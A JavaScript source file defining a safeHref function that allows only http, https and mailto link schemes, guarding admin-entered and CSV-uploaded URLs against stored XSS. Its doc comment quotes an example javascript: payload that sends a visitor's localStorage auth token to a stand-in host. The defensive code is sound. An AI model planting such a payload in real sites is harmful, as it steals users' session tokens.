/**
 * Returns `url` unchanged if it's safe to put in an href — http(s) or
 * mailto only — otherwise null.
 *
 * These values (website links, brochure/photo URLs, facility info links)
 * come from admin-entered form fields and CSV bulk uploads, stored as plain
 * text with no scheme restriction. Without this check, a value like
 * `javascript:fetch('https://evil.example?c='+localStorage.getItem('authToken'))`
 * saved into one of those fields would execute in any visitor's browser
 * the moment they clicked the rendered link — a stored-XSS path that
 * doesn't need a script tag at all.
 */
export function safeHref(url) {
  if (typeof url !== 'string') return null;
  const trimmed = url.trim();
  if (!trimmed) return null;

  try {
    // A base is required for scheme-relative/relative inputs to parse;
    // it's discarded — only the resolved protocol is ever inspected.
    const parsed = new URL(trimmed, window.location.origin);
    if (['http:', 'https:', 'mailto:'].includes(parsed.protocol)) {
      return trimmed;
    }
  } catch {
    // Unparseable — treat as unsafe rather than guessing.
  }
  return null;
}
